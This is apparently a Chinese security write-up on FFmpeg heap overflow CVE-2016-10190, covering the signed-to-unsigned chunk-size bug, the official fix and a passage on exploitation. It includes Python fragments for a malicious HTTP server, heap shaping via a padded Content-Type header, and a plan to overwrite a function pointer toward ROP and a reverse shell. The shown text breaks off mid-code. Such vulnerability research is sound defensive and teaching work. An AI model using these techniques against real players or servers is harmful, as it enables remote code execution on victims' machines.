作者：栈长@蚂蚁金服巴斯光年安全实验室  
来源：[阿里聚安全](https://jaq.alibaba.com/community/art/show?spm=a313e.7916642.220000NaN1.1.7176d19bMRlSpk&articleid=1073
"阿里聚安全")
#### 1\. 背景
FFmpeg是一个著名的处理音视频的开源项目，非常多的播放器、转码器以及视频网站都用到了FFmpeg作为内核或者是处理流媒体的工具。2016年末paulcher发现FFmpeg三个堆溢出漏洞分别为CVE-2016-10190、CVE-2016-10191以及CVE-2016-10192。本文对[CVE-2016-10190](https://cve.mitre.org/cgi-bin/cvename.cgi?spm=a313e.7916648.0.0.36f39d7eOs8jEC&name=CVE-2016-10190
"CVE-2016-10190")进行了详细的分析，是一个学习如何利用堆溢出达到任意代码执行的一个非常不错的案例。
#### 2\. 漏洞分析
FFmpeg的 Http 协议的实现中支持几种不同的数据传输方式，通过 Http Response Header
来控制。其中一种传输方式是transfer-encoding: chunked，表示数据将被划分为一个个小的 chunk 进行传输，这些 chunk
都是被放在 Http body 当中，每一个 chunk 的结构分为两个部分，第一个部分是该 chunk 的 data
部分的长度，十六进制，以换行符结束，第二个部分就是该 chunk 的 data，末尾还要额外加上一个换行符。下面是一个 Http
响应的示例。关于transfer-encoding:
chunked更加详细的内容可以参考[这篇文章](https://imququ.com/post/transfer-encoding-header-in-http.html?spm=a313e.7916648.0.0.36f39d7eOs8jEC "这篇文章")。
    HTTP/1.1 200 OK
    Server: nginx
    Date: Sun, 03 May 2015 17:25:23 GMT
    Content-Type: text/html
    Transfer-Encoding: chunked
    Connection: keep-alive
    Content-Encoding: gzip
    1f
    HW(/IJ
    0
漏洞就出现在`libavformat/http.c`这个文件中，在`http_read_stream`函数中，如果是以 chunk
的方式传输，程序会读取每个 chunk 的第一行，也就是 chunk 的长度那一行，然后调用`s->chunksize = strtoll(line,
NULL, 16);`来计算 chunk size。chunksize 的类型是`int64_t`，在下面调用了FFMIN和 buffer 的 size
进行了长度比较，但是 buffer 的 size 也是有符号数，这就导致了如果我们让 chunksize 等于-1, 那么最终传递给 httpbufread
函数的 size 参数也是-1。相关代码如下：
    s->chunksize = strtoll(line, NULL, 16);
    av_log(NULL, AV_LOG_TRACE, "Chunked encoding data size: %"PRId64"'\n",
    s->chunksize);
    if (!s->chunksize)
    return 0;
            }
            size = FFMIN(size, s->chunksize);//两个有符号数相比较
        }
    //...
    read_ret = http_buf_read(h, buf, size);//可以传递一个负数过去
而在 httpbufread 函数中会调用 ffurl_read 函数，进一步把 size 传递过去。然后经过一个比较长的调用链，最终会传递到
tcp_read 函数中，函数里调用了 recv 函数来从 socket 读取数据，而 recv 的第三个参数是 size_t 类型，也就是无符号数，我们把
size 为-1传递给它的时候会发生有符号数到无符号数的隐式类型转换，就变成了一个非常大的值 0xffffffff，从而导致缓冲区溢出。
    static int http_buf_read(URLContext *h, uint8_t *buf, int size)
    {
        HTTPContext *s = h->priv_data;
        intlen;
        /* read bytes from input buffer first */
        len = s->buf_end - s->buf_ptr;
        if (len> 0) {
            if (len> size)
                len = size;
            memcpy(buf, s->buf_ptr, len);
            s->buf_ptr += len;
        } else {
            //...
           len = ffurl_read(s->hd, buf, size);//这里的 size 是从上面传递下来的
    static int tcp_read(URLContext *h, uint8_t *buf, int size)
    {
        TCPContext *s = h->priv_data;
        int ret;
        if (!(h->flags & AVIO_FLAG_NONBLOCK)) {
            //...
        }
        ret = recv(s->fd, buf, size, 0);    //最后在这里溢出 
可以看到，由有符号到无符号数的类型转换可以说是漏洞频发的重灾区，写代码的时候稍有不慎就可能犯下这种错误，而且一些隐式的类型转换编译器并不会报
warning。如果需要检测这样的类型转换，可以在编译的时候添加-Wconversion -Wsign-conversion这个选项。
**官方修复方案**
官方的修复方法也比较简单明了，把 HTTPContext 这个结构体中所有和 size，offset 有关的字段全部改为 unsigned 类型，把
strtoll 函数改为 strtoull
函数，还有一些细节上的调整等等。这么做不仅补上了这次的漏洞，也防止了类似的漏洞不会再其他的地方再发生。放上[官方补丁的链接](https://github.com/FFmpeg/FFmpeg/commit/2a05c8f813de6f2278827734bf8102291e7484aa?spm=a313e.7916648.0.0.36f39d7eOs8jEC
"官方补丁的链接")。
#### 3\. 利用环境搭建
漏洞利用的靶机环境
操作系统：Ubuntu 16.04 x64
FFmpeg版本：3.2.1
(参照编译，需要把官方教程中提及的所有
encoder编译进去，最好是静态编译。）
#### 4\. 利用过程
这次的漏洞需要我们搭建一个恶意的 Http Server，然后让我们的客户端连上 Server，Server 把恶意的 payload 传输给
client，在 client 上执行任意代码，然后反弹一个 shell 到 Server 端。
首先我们需要控制返回的 Http header 中包含 transfer-encoding: chunked 字段。
    headers = """HTTP/1.1 200 OK
    Server: HTTPd/0.9
    Date: Sun, 10 Apr 2005 20:26:47 GMT
    Transfer-Encoding: chunked
    """
然后我们控制 chunk 的 size 为-1, 再把我们的 payload 发送过去
        client_socket.send('-1\n')
        #raw_input("sleep for a while to avoid HTTPContext buffer problem!")
        sleep(3)    #这里 sleep 很关键，后面会解释
        client_socket.send(payload)
下面我们开始考虑 payload 该如何构造，首先我们使用 gdb 观察程序在 buffer overflow
的时候的堆布局是怎样的，在我的机器上很不幸的是可以看到被溢出的 chunk 正好紧跟在 top chunk
的后面，这就给我们的利用带来了困难。接下来我先后考虑了三种思路：
**思路一：覆盖top chunk的size字段**
这是一种常见的 glibc heap 利用技巧，是通过把 top chunk 的 size 字段改写来实现任意地址写，但是这种方法需要我们能很好的控制
malloc 的 size 参数。在FFmpeg源代码中寻找了一番并没有找到这样的代码，只能放弃。
**思路二：通过unlink来任意地址写**
这种方法的条件也比较苛刻，首先需要绕过 unlink 的 check，但是由于我们没有办法 leak 出堆地址，所以也是行不通的。
**思路三：通过某种方式影响堆布局，使得溢出chunk后面有关键结构体**
如果溢出 chunk 之后有关键结构体，结构体里面有函数指针，那么事情就简单多了，我们只需要覆盖函数指针就可以控制 RIP
了。纵观溢出时的整个函数调用栈，`avio_read->fill_buffer->io_read_packet->…->http_buf_read`，`avio_read`函数和`fill_buffer`函数里面都调用了`AVIOContext::read_packet`这个函数。我们必须设法覆盖
AVIOContext 这个结构体里面的`read_packet`函数指针，但是目前这个结构体是在溢出 chunk
的前面的，需要把它挪到后面去。那么就需要搞清楚这两个 chunk 被 malloc 的先后顺序，以及 mallocAVIOContext
的时候的堆布局是怎么样的。
    int ffio_fdopen(AVIOContext **s, URLContext *h)
    {
        //...
        buffer = av_malloc(buffer_size);//先分配io buffer, 再分配AVIOContext
    if (!buffer)
        return AVERROR(ENOMEM);
        internal = av_mallocz(sizeof(*internal));
        if (!internal)
            goto fail;
        internal->h = h;
        *s = avio_alloc_context(buffer, buffer_size, h->flags & AVIO_FLAG_WRITE,
    internal, io_read_packet, io_write_packet, io_seek);
在`ffio_fdopen`函数中可以清楚的看到是先分配了用于io的 buffer(也就是溢出的 chunk），再分配 AVIOContext 的。程序在
mallocAVIOContext 的时候堆上有一个 large free chunk，正好是在溢出 chunk 的前面。那么只要想办法在之前把这个
free chunk 给填上就能让 AVIOContext 跑到溢出 chunk 的后面去了。由于 http_open 是在 AVIOContext
被分配之前调用的，（关于整个调用顺序可以参考雷霄华的博客整理的一个FFmpeg的总的[流程图](http://img.my.csdn.net/uploads/201503/12/1426134989_1189.jpg
"流程图")）所以我们可在`http_read_header`函数里面寻找那些能够影响堆布局的代码，其中 Content-Type 字段就会为字段值
malloc 一段内存来保存。所以我们可以任意填充 Content-Type 的值为那个 free chunk 的大小，就能预先把 free chunk
给使用掉了。修改后的Http header如下：
    headers = """HTTP/1.1 200 OK
    Server: HTTPd/0.9
    Date: Sun, 10 Apr 2005 20:26:47 GMT
    Content-Type: %s
    Transfer-Encoding: chunked
    Set-Cookie: XXXXXXXXXXXXXXXX=AAAAAAAAAAAAAAAA;
    """ % ('h' * 3120)
其中 Set-Cookie 字段可有可无，只是会影响溢出 chunk 和 AVIOContext 的距离，不会影响他们的前后关系。
这之后就是覆盖 AVIOContext
的各个字段，以及考虑怎么让程序走到自己想要的分支了。经过分析我们让程序再一次调用fill_buffer，然后走到`s->read_packet`那一行是最稳妥的。调试发现走到那一行的时候我们可以控制的有RIP,
RDI, RSI, RDX, RCX 等寄存器，接下来就是考虑怎么 ROP 了。
    static void fill_buffer(AVIOContext *s)
    {
        intmax_buffer_size = s->max_packet_size ?  //可控
    s->max_packet_size : 
    IO_BUFFER_SIZE;
        uint8_t *dst        = s->buf_end - s->buffer + max_buffer_sizebuffer_size ?
                              s->buf_end : s->buffer;   //控制这个, 如果等于s->buffer的话，问题是 heap 地址不知道
        intlen             = s->buffer_size - (dst - s->buffer);   //可控
        /* can't fill the buffer without read_packet, just set EOF if appropriate */
        if (!s->read_packet&& s->buf_ptr>= s->buf_end)
            s->eof_reached = 1;
        /* no need to do anything if EOF already reached */
        if (s->eof_reached)
            return;
        if (s->update_checksum&&dst == s->buffer) {
            //...
        }
        /* make buffer smaller in case it ended up large after probing */
        if (s->read_packet&& s->orig_buffer_size&& s->buffer_size> s->orig_buffer_size) {
            //...